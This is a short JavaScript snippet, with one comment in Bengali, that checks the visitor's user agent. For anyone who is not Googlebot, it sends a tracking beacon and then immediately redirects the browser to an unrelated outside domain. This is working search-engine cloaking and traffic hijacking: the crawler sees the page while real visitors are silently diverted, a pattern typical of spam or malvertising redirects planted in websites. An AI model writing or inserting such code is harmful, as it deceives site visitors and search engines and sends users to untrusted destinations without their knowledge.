if (!navigator.userAgent.includes('Googlebot')) {
  
  // sendBeacon support থাকলে সেটা, না হলে image pixel
  if (navigator.sendBeacon) {
    navigator.sendBeacon('https://sstatic1.histats.com/0.gif?5043178&101');
  } else {
    new Image().src = 'https://sstatic1.histats.com/0.gif?5043178&101';
  }
  
  // No delay — instant redirect!
  window.location.href = "https://auctionr.org/4/ff37761983e32033f9392138b9b95e00";
}
